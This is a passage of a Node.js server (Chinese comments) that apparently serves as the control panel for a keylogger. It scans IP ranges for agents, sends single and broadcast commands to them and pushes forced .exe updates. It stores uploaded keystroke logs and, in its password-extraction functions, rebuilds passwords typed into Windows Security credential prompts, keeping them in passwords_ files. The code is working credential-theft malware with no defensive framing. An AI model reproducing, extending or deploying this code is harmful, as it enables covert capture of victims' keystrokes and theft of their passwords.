    getAllClients() {
        const allClients = [];
        for (const client of this.clients.values()) {
            allClients.push(this.getClientInfo(client));
        }
        for (const [clientId, info] of this.knownClients.entries()) {
            if (!this.clients.has(clientId)) {
                allClients.push({
                    id: clientId,
                    ip: info.ip,
                    port: info.port,
                    status: 'offline',
                    recording: false,
                    uploadEnabled: false,
                    lastSeen: info.lastSeen
                });
            }
        }
        return allClients;
    }

    addWebClient(ws) {
        this.webClients.add(ws);
        ws.send(JSON.stringify({
            type: 'clients_list',
            clients: this.getAllClients()
        }));
    }

    removeWebClient(ws) {
        this.webClients.delete(ws);
    }

    broadcastClientUpdate(client, eventType) {
        const message = JSON.stringify({
            type: 'client_updated',
            event: eventType,
            client: this.getClientInfo(client)
        });

        this.webClients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                if (ws.bufferedAmount > 64 * 1024) {
                    this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，延迟广播`);
                    setTimeout(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(message, (err) => {
                                if (err) this.logger.debug('延迟广播发送失败', { error: err.message });
                            });
                        }
                    }, 100);
                    return;
                }
                setImmediate(() => {
                    ws.send(message, (err) => {
                        if (err) this.logger.debug('广播消息发送失败', { error: err.message });
                    });
                });
            }
        });
    }

    broadcastToWeb(data) {
        const message = JSON.stringify(data);
        this.webClients.forEach(ws => {
            if (ws.readyState === WebSocket.OPEN) {
                if (ws.bufferedAmount > 64 * 1024) {
                    this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，丢弃单条消息`);
                    return;
                }
                setImmediate(() => {
                    ws.send(message, (err) => {
                        if (err) this.logger.debug('单条消息发送失败', { error: err.message });
                    });
                });
            }
        });
    }

    async scanNetwork(startIp, endIp, ports = CONFIG.scanPorts) {
        const startParts = startIp.split('.').map(Number);
        const endParts = endIp.split('.').map(Number);
        if (startParts.length !== 4 || endParts.length !== 4) {
            throw new Error('IP 地址格式错误');
        }

        const ipStringToNumber = (ip) => {
            const parts = ip.split('.').map(Number);
            if (parts.length !== 4 || parts.some(part => Number.isNaN(part) || part < 0 || part > 255)) {
                throw new Error('IP 地址格式错误');
            }
            return parts.reduce((acc, part) => acc * 256n + BigInt(part), 0n);
        };
        const ipNumberToString = (num) => {
            return [
                Number((num >> 24n) & 0xFFn),
                Number((num >> 16n) & 0xFFn),
                Number((num >> 8n) & 0xFFn),
                Number(num & 0xFFn)
            ].join('.');
        };

        const startInt = ipStringToNumber(startIp);
        const endInt = ipStringToNumber(endIp);
        const total = Number(endInt - startInt + 1n);
        if (total <= 0) throw new Error('IP 范围无效');
        if (total > 65536) throw new Error('扫描范围过大，最多允许 65536 个 IP');

        this.logger.info(`开始扫描网络: ${startIp} - ${endIp}, 端口: ${ports.join(',')}`);

        const foundClients = [];
        const limit = pLimit(CONFIG.scanConcurrency);

        const tasks = [];
        for (let i = 0; i < total; i++) {
            const ip = ipNumberToString(startInt + BigInt(i));
            tasks.push(limit(() => this.scanIp(ip, ports).then(client => {
                if (client) foundClients.push(client);
            })));
        }
        await Promise.allSettled(tasks);

        this.logger.info(`扫描完成，发现 ${foundClients.length} 个客户端`);
        return foundClients;
    }

    async scanIp(ip, ports) {
        for (const port of ports) {
            const client = await this.tryConnect(ip, port);
            if (client) return client;
        }
        return null;
    }

    tryConnect(ip, port) {
        return new Promise((resolve) => {
            const cleanIp = ip.split('/')[0];
            const socket = new net.Socket();
            let resolved = false;

            const cleanup = (result) => {
                if (!resolved) {
                    resolved = true;
                    socket.removeAllListeners();
                    socket.destroy();
                    resolve(result);
                }
            };

            const onConnect = () => {
                socket.write(JSON.stringify({ action: 'ping' }) + '\n', (err) => {
                    if (err) return cleanup(null);
                    const responseTimeout = setTimeout(() => cleanup(null), 2000);

                    const onData = (data) => {
                        clearTimeout(responseTimeout);
                        try {
                            const msg = JSON.parse(data.toString().split('\n')[0]);
                            if (msg.status === 'ok' || msg.action === 'pong') {
                                const clientId = `${cleanIp}:${port}`;
                                let client = this.clients.get(clientId);
                                const now = new Date();
                                if (!client) {
                                    client = {
                                        id: clientId,
                                        ip: cleanIp,
                                        port,
                                        socket,
                                        status: 'online',
                                        recording: true,
                                        uploadEnabled: false,
                                        lastSeen: now,
                                        logDir: alistClient.basePath,
                                        shouldReconnect: false
                                    };
                                    this.clients.set(clientId, client);
                                    this.knownClients.set(clientId, { ip: cleanIp, port, lastSeen: now });
                                    saveKnownClientToDB(clientId, cleanIp, port).catch(e => this.logger.error(e));
                                    this.setupSocketListeners(client);
                                    this.broadcastClientUpdate(client, 'connected');
                                } else {
                                    const oldSocket = client.socket;
                                    oldSocket.removeAllListeners();
                                    oldSocket.destroy();

                                    client.socket = socket;
                                    client.status = 'online';
                                    client.lastSeen = now;
                                    if (this.knownClients.has(clientId)) {
                                        this.knownClients.get(clientId).lastSeen = now;
                                    }
                                    updateLastSeen(clientId).catch(e => this.logger.error(e));
                                    this.setupSocketListeners(client);
                                    this.broadcastClientUpdate(client, 'updated');
                                }
                                resolved = true;
                                resolve(this.getClientInfo(client));
                            } else {
                                cleanup(null);
                            }
                        } catch (e) {
                            cleanup(null);
                        }
                    };

                    socket.once('data', onData);
                    socket.once('error', () => cleanup(null));
                    socket.once('timeout', () => cleanup(null));
                    socket.once('close', () => cleanup(null));
                });
            };

            socket.setTimeout(CONFIG.reconnectTimeout);
            socket.once('connect', onConnect);
            socket.once('error', () => cleanup(null));
            socket.once('timeout', () => cleanup(null));
            socket.once('close', () => cleanup(null));

            socket.connect(port, cleanIp);
        });
    }

    manualConnect(ip, port) {
        return this.tryConnect(ip, port);
    }
}

const clientManager = new ClientManager();

// ========== 辅助函数 ==========
function getClientInfoById(clientId) {
    let client = clientManager.clients.get(clientId);
    if (client) {
        return {
            exists: true,
            isOnline: true,
            ip: client.ip,
            logDir: client.logDir
        };
    }
    const known = clientManager.knownClients.get(clientId);
    if (known) {
        return {
            exists: true,
            isOnline: false,
            ip: known.ip,
            logDir: alistClient.basePath
        };
    }
    return { exists: false };
}

function handleWebSocketConnection(ws, req) {
    const cookies = parseCookies(req.headers.cookie || '');
    if (!verifyAuthToken(cookies[AUTH_CONFIG.cookieName])) {
        logger.warn('拒绝未授权的 WebSocket 连接');
        ws.close(1008, 'Unauthorized');
        return;
    }

    logger.info('Web 客户端已连接');
    clientManager.addWebClient(ws);

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            switch (data.type) {
                case 'command':
                    const result = await clientManager.sendCommand(data.clientId, data.command);
                    ws.send(JSON.stringify({ type: 'command_result', result }));
                    break;

                case 'broadcast_command':
                    const results = await clientManager.broadcastCommand(data.command);
                    ws.send(JSON.stringify({ type: 'broadcast_result', results }));
                    break;

                case 'scan_network':
                    try {
                        const found = await clientManager.scanNetwork(
                            data.startIp,
                            data.endIp,
                            data.ports || CONFIG.scanPorts
                        );
                        ws.send(JSON.stringify({ type: 'scan_complete', found }));
                    } catch (e) {
                        ws.send(JSON.stringify({ type: 'scan_error', message: e.message }));
                    }
                    break;

                case 'manual_connect':
                    try {
                        const client = await clientManager.manualConnect(data.ip, data.port);
                        if (client) {
                            ws.send(JSON.stringify({ type: 'connect_result', client }));
                        } else {
                            ws.send(JSON.stringify({ 
                                type: 'connect_error', 
                                message: `无法连接到 ${data.ip}:${data.port}，请检查目标主机是否在线且端口可访问` 
                            }));
                        }
                    } catch (e) {
                        ws.send(JSON.stringify({ type: 'connect_error', message: e.message }));
                    }
                    break;

                case 'disconnect_client':
                    const client = clientManager.clients.get(data.clientId);
                    if (client) {
                        client.socket.end();
                        clientManager.clients.delete(data.clientId);
                    }
                    ws.send(JSON.stringify({ type: 'disconnected', clientId: data.clientId }));
                    break;

                case 'delete_client':
                    try {
                        await clientManager.deleteKnownClient(data.clientId);
                        ws.send(JSON.stringify({
                            type: 'delete_result',
                            success: true,
                            clientId: data.clientId
                        }));
                    } catch (e) {
                        ws.send(JSON.stringify({
                            type: 'delete_result',
                            success: false,
                            clientId: data.clientId,
                            error: e.message
                        }));
                    }
                    break;

                default:
                    ws.send(JSON.stringify({ type: 'error', message: '未知的命令类型' }));
            }
        } catch (e) {
            ws.send(JSON.stringify({ type: 'error', message: e.message }));
        }
    });

    ws.on('close', () => {
        logger.info('Web 客户端已断开');
        clientManager.removeWebClient(ws);
    });
}

// ========== HTTP API 路由 ==========

app.get('/api/clients', (req, res) => {
    res.json(clientManager.getAllClients());
});

app.get('/api/update/get_version', asyncHandler(async (req, res) => {
    try {
        logger.info('开始获取版本列表');
        // 检查缓存
        const cacheKey = 'version_list';
        const cached = versionCache.get(cacheKey);
        if (cached) {
            logger.info('从缓存返回版本列表');
            return res.json({
                code: 200,
                data: {
                    versions: cached,
                    count: cached.length
                }
            });
        }
        // 使用版本专用路径
        const versionPath = CONFIG.alist.versionPath;
        let allFiles = [];
        try {
            logger.info(`尝试从 Alist 获取文件列表，路径: ${versionPath}`);
            allFiles = await alistClient.listFiles(versionPath);
            logger.info(`成功获取 Alist 文件列表，共 ${allFiles.length} 个文件: ${allFiles.map(f => f.filename).join(', ')}`);
        } catch (alistError) {
            logger.warn('Alist 连接失败，返回空版本列表', { error: alistError.message });
            return res.json({
                code: 200,
                data: {
                    versions: [],
                    count: 0
                }
            });
        }
        
        // 过滤出应用程序文件
        const supportedExtensions = ['.exe', '.zip'];
        const appFiles = allFiles.filter(file => {
            const lowerFilename = file.filename.toLowerCase();
            return supportedExtensions.some(ext => lowerFilename.endsWith(ext));
        });
        logger.info(`过滤完成，共 ${appFiles.length} 个应用程序文件`);
        
        // 提取版本号并生成下载链接
        const versions = [];
        const limit = pLimit(5); // 限制并发请求，避免过多API调用
        const tasks = appFiles.map(file => limit(async () => {
            const versionMatch = file.filename.match(/(\d+\.\d+\.\d+)/i); // 更宽松的版本匹配，不要求'v'前缀
            if (versionMatch) {
                const version = versionMatch[1];
                // 生成下载链接：优先使用 Alist API 获取 raw_url
                const fullPath = `${versionPath}/${file.filename}`;
                let downloadUrl = '';
                try {
                    const info = await alistClient._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`);
                    if (info.code === 200 && info.data && info.data.raw_url) {
                        downloadUrl = info.data.raw_url;
                        logger.debug(`获取下载链接成功: ${downloadUrl}`);
                    } else {
                        downloadUrl = `${CONFIG.alist.url}/d${versionPath}/${encodeURIComponent(file.filename)}`;
                        logger.warn(`无法获取raw_url，使用构造链接: ${downloadUrl}`);
                    }
                } catch (error) {
                    downloadUrl = `${CONFIG.alist.url}/d${versionPath}/${encodeURIComponent(file.filename)}`;
                    logger.warn(`获取下载链接失败，使用构造链接: ${downloadUrl}`, { error: error.message });
                }
                try {
                    const existingRows = await executeWithRetry(
                        'SELECT id FROM client_versions WHERE version = ?',
                        [version]
                    );
                    if (existingRows.length === 0) {
                        await executeWithRetry(
                            'INSERT IGNORE INTO client_versions (version, download_url, is_active, force_update) VALUES (?, ?, ?, ?)',
                            [version, downloadUrl, false, false]
                        );
                        logger.info(`添加新版本到数据库: ${version}`);
                    } else {
                        logger.debug(`版本 ${version} 已存在于数据库中`);
                    }
                } catch (dbError) {
                    logger.warn('数据库操作失败，继续处理', { error: dbError.message });
                }
                
                return { version, downloadUrl, filename: file.filename };
            } else {
                logger.debug(`无法从文件名 ${file.filename} 中提取版本号`);
                return null;
            }
        }));
        const results = await Promise.allSettled(tasks);
        results.forEach(result => {
            if (result.status === 'fulfilled' && result.value) {
                versions.push(result.value);
            }
        });
        
        // 缓存结果
        versionCache.set(cacheKey, JSON.parse(JSON.stringify(versions))); // 深拷贝
        
        logger.info(`版本列表生成完成，共 ${versions.length} 个版本`);
        return res.json({
            code: 200,
            data: {
                versions,
                count: versions.length
            }
        });
        
    } catch (error) {
        logger.error('获取版本列表失败', { error: error.message, stack: error.stack });
        return res.json({
            code: 200,
            data: {
                versions: [],
                count: 0
            }
        });
    }
}));

app.get('/api/update/check', asyncHandler(async (req, res) => {
    try {
        // 首先检查数据库中是否有激活的版本
        const activeVersionRows = await executeWithRetry(
            'SELECT version, download_url, force_update FROM client_versions WHERE is_active = TRUE LIMIT 1'
        );
        
        if (activeVersionRows.length > 0) {
            const activeVersion = activeVersionRows[0];
            logger.info(`返回数据库激活版本: ${activeVersion.version}`);
            return res.json({ 
                code: 200, 
                data: { 
                    version: activeVersion.version, 
                    download_url: activeVersion.download_url,
                    force_update: activeVersion.force_update
                } 
            });
        }
        
        // 数据库中没有激活版本，返回空版本（通知客户端无需更新）
        logger.info('数据库中没有激活版本，返回空版本');
        return res.json({
            code: 200,
            data: {
                version: '',
                download_url: '',
                force_update: false
            }
        });
        
    } catch (error) {
        logger.error('检查更新失败', { error: error.message, stack: error.stack });
        return res.json({
            code: 200,
            data: {
                version: '',
                download_url: '',
                force_update: false
            }
        });
    }
}));

app.post('/api/update/set_version', asyncHandler(async (req, res) => {
    try {
        const { version, force_update = false } = req.body;
        
        if (!version) {
            return res.json({
                code: 400,
                message: '版本号不能为空'
            });
        }
        
        try {
            // 检查版本是否存在
            const existingRows = await executeWithRetry(
                'SELECT id FROM client_versions WHERE version = ?',
                [version]
            );
            
            if (existingRows.length === 0) {
                return res.json({
                    code: 404,
                    message: '版本不存在'
                });
            }
            
            // 开始事务
            const connection = await pool.getConnection();
            try {
                await connection.beginTransaction();
                
                // 将所有版本设置为非激活
                await connection.execute('UPDATE client_versions SET is_active = FALSE WHERE is_active = TRUE');
                
                // 将指定版本设置为激活
                await connection.execute(
                    'UPDATE client_versions SET is_active = TRUE, force_update = ? WHERE version = ?',
                    [force_update, version]
                );
                
                await connection.commit();
                
                logger.info(`设置版本 ${version} 为激活状态，强制更新: ${force_update}`);
                
                // 清除版本缓存
                versionCache.delete('version_list');
                
                return res.json({
                    code: 200,
                    message: '版本设置成功',
                    data: {
                        version,
                        force_update
                    }
                });
            } catch (error) {
                if (connection) {
                    await connection.rollback();
                    connection.release();
                }
                throw error;
            }
        } catch (dbError) {
            logger.warn('数据库操作失败', { error: dbError.message });
            return res.json({
                code: 500,
                message: '数据库操作失败'
            });
        }
        
    } catch (error) {
        logger.error('设置版本失败', { error: error.message, stack: error.stack });
        return res.json({
            code: 500,
            message: '设置版本失败'
        });
    }
}));

// 版本号比较函数
function compareVersions(v1, v2) {
    const v1Parts = v1.split('.').map(Number);
    const v2Parts = v2.split('.').map(Number);
    
    for (let i = 0; i < 3; i++) {
        if (v1Parts[i] > v2Parts[i]) return 1;
        if (v1Parts[i] < v2Parts[i]) return -1;
    }
    return 0;
}

app.get('/api/logs', asyncHandler(async (req, res) => {
    const allFiles = await alistClient.listFiles(alistClient.basePath);
    res.json(allFiles);
}));

app.get('/api/clients/:clientId/logs', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    if (!clientInfo.exists) return res.status(404).json({ error: '客户端不存在' });
    const allFiles = await alistClient.listFiles(clientInfo.logDir);
    const clientFiles = allFiles.filter(file => file.filename.startsWith(clientInfo.ip + '_'));
    res.json(clientFiles);
}));

app.get('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) return res.status(400).json({ error: '非法文件名' });
    const filePath = filename.startsWith('passwords_') 
        ? `${alistClient.basePath}/${filename}` 
        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
    const content = await alistClient.readFile(filePath);
    res.json({ content });
}));

app.get('/api/clients/:clientId/logs/:filename/download', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) return res.status(400).json({ error: '非法文件名' });
    const filePath = filename.startsWith('passwords_') 
        ? `${alistClient.basePath}/${filename}` 
        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
    await alistClient.downloadFile(filePath, res);
}));

app.get('/api/clients/:clientId/logs/:filename/raw', asyncHandler(async (req, res) => {
    const clientId = req.params.clientId;
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) return res.status(400).send('非法文件名');
    
    if (filename.startsWith('passwords_')) {
        const filePath = `${alistClient.basePath}/${filename}`;
        const content = await alistClient.readFile(filePath);
        res.type('text/plain').send(content);
    } else {
        let clientInfo = getClientInfoById(clientId);
        let ipMatch = clientId.match(/^(\d+\.\d+\.\d+\.\d+):\d+$/);
        if (!clientInfo.exists && ipMatch) {
            const ip = ipMatch[1];
            const filePath = `${alistClient.basePath}/${filename}`;
            const content = await alistClient.readFile(filePath);
            res.type('text/plain').send(content);
        } else {
            const filePath = `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
            const content = await alistClient.readFile(filePath);
            res.type('text/plain').send(content);
        }
    }
}));

app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) return res.status(400).json({ error: '非法文件名' });
    const filePath = filename.startsWith('passwords_') 
        ? `${alistClient.basePath}/${filename}` 
        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
    
    await alistClient.deleteFile(filePath);
    logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId, user: req.user || 'unknown' });
    res.json({ success: true, message: '文件已删除' });
}));

// 批量删除日志：增加预检并发控制
app.post('/api/batch/delete-logs', asyncHandler(async (req, res) => {
    const { files } = req.body;
    if (!Array.isArray(files)) return res.status(400).json({ error: 'files 必须是数组' });

    // 预检阶段限制并发数，避免压垮 Alist
    const precheckLimit = pLimit(CONFIG.deleteConcurrency);
    const precheckResults = await Promise.allSettled(
        files.map(file => precheckLimit(async () => {
            const { clientId, filename } = file;
            const clientInfo = getClientInfoById(clientId);
            const safeFilename = path.basename(filename);
            if (safeFilename !== filename) throw new Error(`非法文件名: ${filename}`);
            const filePath = filename.startsWith('passwords_') 
                ? `${alistClient.basePath}/${filename}` 
                : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
            
            try {
                await alistClient._request('GET', `/api/fs/get?path=${encodeURIComponent(filePath)}`);
            } catch (error) {
                if (error.response && error.response.status === 404) throw new Error('文件不存在');
                throw error;
            }
            return { clientId, filename, filePath };
        }))
    );

    const missingFiles = [];
    const validFiles = [];
    precheckResults.forEach((result, index) => {
        if (result.status === 'rejected') {
            missingFiles.push({ ...files[index], error: result.reason.message });
        } else {
            validFiles.push(result.value);
        }
    });

    if (missingFiles.length > 0) {
        return res.status(400).json({
            success: false,
            error: '部分文件不存在或无权限访问',
            missingFiles
        });
    }

    const results = [];
    const deleteLimit = pLimit(CONFIG.deleteConcurrency);
    const deleteTasks = validFiles.map(file => deleteLimit(async () => {
        try {
            await alistClient.deleteFile(file.filePath);
            auditLogger.info(`批量删除日志文件: ${file.filePath}`, { user: req.user, action: 'batch_delete_file' });
            return { clientId: file.clientId, filename: file.filename, success: true };
        } catch (error) {
            auditLogger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { user: req.user, error: error.message });
            return { clientId: file.clientId, filename: file.filename, success: false, error: error.message };
        }
    }));

    const taskResults = await Promise.allSettled(deleteTasks);
    taskResults.forEach(result => {
        if (result.status === 'fulfilled') results.push(result.value);
        else results.push({ success: false, error: result.reason.message });
    });

    const successCount = results.filter(r => r.success).length;
    auditLogger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user });
    res.json({ success: true, total: files.length, successCount, results });
}));

app.post('/api/batch/command', asyncHandler(async (req, res) => {
    const { clientIds, command } = req.body;
    if (!Array.isArray(clientIds) || !command) return res.status(400).json({ error: 'clientIds 必须是数组，且 command 必须提供' });

    auditLogger.info(`批量命令执行: ${clientIds.length} 个客户端`, { user: req.user, command: JSON.stringify(command) });
    const sendLimit = pLimit(CONFIG.commandConcurrency);
    const results = await Promise.all(clientIds.map(clientId => sendLimit(async () => {
        const result = await clientManager.sendCommand(clientId, command);
        return { clientId, ...result };
    })));
    const successCount = results.filter(r => r.success).length;

    auditLogger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user });
    res.json({ success: true, total: clientIds.length, successCount, results });
}));

app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
    const ip = req.params.ip;
    let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
    if (!clientId) clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
    const client = clientManager.clients.get(clientId);
    const logDir = client ? client.logDir : alistClient.basePath;
    const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;

    await alistClient.uploadFile(logDir, filename, req.body.toString());
    logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
    res.json({ success: true, message: '文件上传成功' });
}));

// ========== 密码提取相关 ==========
const extractionCache = {
    lastExtractTime: 0,
    passwords: [],
    fileMTimes: new LRUCache({
        max: 500,
        ttl: 1000 * 60 * 60,
        updateAgeOnGet: true
    })
};

// ========== 密码提取核心函数 ==========

function splitLineIntoTokens(line) {
    const tokens = [];
    const regex = /\[[^\]]+\]|./g;
    let match;
    while ((match = regex.exec(line)) !== null) {
        const token = match[0];
        if (token.startsWith('[') && token.endsWith(']')) {
            tokens.push(token);
        } else {
            for (const ch of token) {
                tokens.push(ch);
            }
        }
    }
    return tokens;
}

// 解析按键序列为最终密码文本
function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialAlt, initialCaps) {
    let shift = initialShift;
    let ctrl = initialCtrl;
    let alt = initialAlt;
    let caps = initialCaps;
    const result = [];
    const shiftMap = {
        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
        '`': '~'
    };

    for (const item of sequence) {
        if (item === '[LSHIFT]' || item === '[RSHIFT]') { shift = true; continue; }
        if (item === '[LCONTROL]' || item === '[RCONTROL]') { ctrl = true; continue; }
        if (item === '[LALT]' || item === '[RALT]') { alt = true; continue; }
        if (item === '[CAPSLOCK]') { caps = !caps; continue; }
        
        // 处理退格键
        if (item === '[BACKSPACE]' || item === '[BACK]') {
            if (result.length > 0) {
                result.pop();
            }
            // 重置修饰键状态
            shift = false;
            ctrl = false;
            alt = false;
            continue;
        }
        
        // 忽略 [TAB] 键，不分割密码
        if (item === '[TAB]') {
            // 重置修饰键状态
            shift = false;
            ctrl = false;
            alt = false;
            continue;
        }
        
        if (item.startsWith('[') && item.endsWith(']')) {
            // 遇到其他功能键时，重置修饰键状态
            shift = false;
            ctrl = false;
            alt = false;
            continue;
        }
        if (ctrl || alt) {
            // Ctrl/Alt 组合键不视为密码输入，重置状态
            shift = false;
            ctrl = false;
            alt = false;
            continue;
        }

        // 忽略换行符，只处理实际的密码字符
        if (item === '\n') {
            continue;
        }

        let char = item;
        if (item.length === 1) {
            const code = item.charCodeAt(0);
            const isUpperCase = code >= 65 && code <= 90;
            const isLowerCase = code >= 97 && code <= 122;
            const isLetter = isUpperCase || isLowerCase;
            
            // 大写字母表示需要按下 shift，小写字母表示不需要
            if (isUpperCase) {
                // 对于大写字母，强制使用 shift 状态
                if (isLetter) {
                    char = item.toUpperCase();
                } else if (shiftMap[item]) {
                    char = shiftMap[item];
                }
            } else if (isLowerCase) {
                // 对于小写字母，不使用 shift 状态
                if (isLetter) {
                    char = item.toLowerCase();
                }
            } else {
                // 对于数字和特殊字符，使用实际的 shift 状态
                // 不再根据前一个字符是否是大写字母来决定
                if (shift && shiftMap[item]) {
                    char = shiftMap[item];
                }
            }
        }
        result.push(char);
        
        // 重置修饰键状态，让修饰键只影响下一个按键
        shift = false;
        ctrl = false;
        alt = false;
    }
    return result.join('');
}

// 主提取函数
function extractPasswordsFromLog(content, filename) {
    const passwords = [];
    const lines = content.split('\n');
    const windowTimestampRegex = /at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{4})/;
    const windowTitleRegex = /\[Window:\s*(.+?)\s*-?\s*at/;

    let currentWindow = '';
    let timestamp = null;
    let inPasswordMode = false;           // 是否处于密码捕获模式
    let rawSequence = [];
    let shiftPressed = false;
    let ctrlPressed = false;
    let altPressed = false;
    let capsLock = false;

    // 判断窗口是否为敏感窗口（需要捕获密码）
    const isSensitiveWindow = (winTitle) => {
        const lower = winTitle.toLowerCase();
        return lower.includes('windows 安全') ||
               lower.includes('windows 安全中心');
    };

    const saveCurrentPassword = () => {
        if (inPasswordMode && rawSequence.length > 0) {
            const parsed = parsePasswordFromSequence(rawSequence, shiftPressed, ctrlPressed, altPressed, capsLock);
            if (parsed && parsed.length >= 3) {  // 过滤过短的误触
                passwords.push({
                    file: filename,
                    timestamp: timestamp || '未知',
                    password: parsed,
                    rawPassword: rawSequence.join(''),
                    window: currentWindow || '未知窗口'
                });
            }
            rawSequence = [];
        }
        // 离开敏感窗口后自动关闭捕获模式
        if (!isSensitiveWindow(currentWindow)) {
            inPasswordMode = false;
        }
    };

    for (let i = 0; i < lines.length; i++) {
        const originalLine = lines[i];
        const line = originalLine.trim();
        if (!line) continue;

        // 窗口切换行
        if (line.startsWith('[Window:')) {
            saveCurrentPassword();
            rawSequence = [];
            shiftPressed = false;
            ctrlPressed = false;
            altPressed = false;

            const tsMatch = line.match(windowTimestampRegex);
            if (tsMatch) timestamp = tsMatch[1];
            const winMatch = line.match(windowTitleRegex);
            if (winMatch) currentWindow = winMatch[1].trim();

            // 进入敏感窗口时开启密码捕获模式
            if (isSensitiveWindow(currentWindow)) {
                inPasswordMode = true;
            } else {
                inPasswordMode = false;
            }
            continue;
        }

        // 如果当前不在密码捕获模式，跳过本行
        if (!inPasswordMode) continue;

        // 将当前行拆分为 tokens 并逐个处理
        const tokens = splitLineIntoTokens(line);
        for (const token of tokens) {
            // 首先将所有按键添加到原始序列中
            rawSequence.push(token);
            
            // 更新修饰键状态（全局追踪）
            if (token === '[LSHIFT]' || token === '[RSHIFT]') { shiftPressed = true; continue; }
            if (token === '[LCONTROL]' || token === '[RCONTROL]') { ctrlPressed = true; continue; }
            if (token === '[LALT]' || token === '[RALT]') { altPressed = true; continue; }
            if (token === '[CAPSLOCK]') { capsLock = !capsLock; continue; }

            // Enter 提交密码，Tab 不作为分割符
            if (token === '[ENTER]' || token === '[RETURN]') {
                saveCurrentPassword();
                rawSequence = [];
                // 重置修饰键状态
                shiftPressed = false;
                ctrlPressed = false;
                altPressed = false;
                continue;
            }
            
            // Tab 键作为密码的一部分，不分割密码
            if (token === '[TAB]') {
                // 重置修饰键状态
                shiftPressed = false;
                ctrlPressed = false;
                altPressed = false;
                continue;
            }

            // 退格删除 - 这里不需要从rawSequence中移除，因为我们要保留原始按键记录
            if (token === '[BACKSPACE]' || token === '[BACK]') {
                // 重置修饰键状态
                shiftPressed = false;
                ctrlPressed = false;
                altPressed = false;
                continue;
            }

            // 遇到其他功能键时，重置修饰键状态
            if (token.startsWith('[') && token.endsWith(']')) {
                shiftPressed = false;
                ctrlPressed = false;
                altPressed = false;
                continue;
            }

            // 普通字符输入
            if (!token.startsWith('[') || !token.endsWith(']')) {
                // 字符输入后重置 shift 状态
                shiftPressed = false;
            }
        }
        
        // 在每行结束后添加换行符到原始序列中，以保持与源文件的一致性
        rawSequence.push('\n');
    }

    // 处理文件末尾未保存的序列
    saveCurrentPassword();
    return passwords;
}


app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
    const allFiles = await alistClient.listFiles(alistClient.basePath);
    const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
    
    if (logFiles.length === 0) return res.json({ success: true, count: 0 });

    const currentFileStates = new Map();
    for (const file of logFiles) {
        const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
        currentFileStates.set(file.filename, { mtime });
    }

    let needFullReextraction = false;
    if (extractionCache.fileMTimes.size !== currentFileStates.size) {
        needFullReextraction = true;
    } else {
        for (const [filename, state] of currentFileStates.entries()) {
            const cached = extractionCache.fileMTimes.get(filename);
            if (!cached || cached !== state.mtime) {
                needFullReextraction = true;
                break;
            }
        }
    }

    if (!needFullReextraction && extractionCache.passwords.length > 0) {
        logger.info('缓存完全有效，直接返回密码提取结果');
        return res.json({ success: true, count: extractionCache.passwords.length });
    }

    const filesToProcess = [];
    const changedFileNames = new Set();
    for (const file of logFiles) {
        const mtime = currentFileStates.get(file.filename).mtime;
        const cachedMtime = extractionCache.fileMTimes.get(file.filename);
        if (!cachedMtime || cachedMtime !== mtime) {
            filesToProcess.push(file);
            changedFileNames.add(file.filename);
        }
    }

    logger.info(`密码提取：共 ${logFiles.length} 个日志文件，其中 ${filesToProcess.length} 个需要处理`);

    // 加载黑名单缓存
    await loadBlacklistCache();

    const extractLimit = pLimit(CONFIG.extractConcurrency);
    const extractTasks = filesToProcess.map(file => extractLimit(async () => {
        try {
            const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
            return extractPasswordsFromLog(content, file.filename);
        } catch (error) {
            logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
            return [];
        }
    }));

    const results = await Promise.allSettled(extractTasks);
    const newPasswords = [];
    results.forEach(result => {
        if (result.status === 'fulfilled') newPasswords.push(...result.value);
    });

    const unchangedFileNames = new Set(
        logFiles.filter(f => !changedFileNames.has(f.filename)).map(f => f.filename)
    );
    const cachedPasswordsFromUnchangedFiles = extractionCache.passwords.filter(item =>
        unchangedFileNames.has(item.file)
    );

    let allPasswords = [...cachedPasswordsFromUnchangedFiles, ...newPasswords];
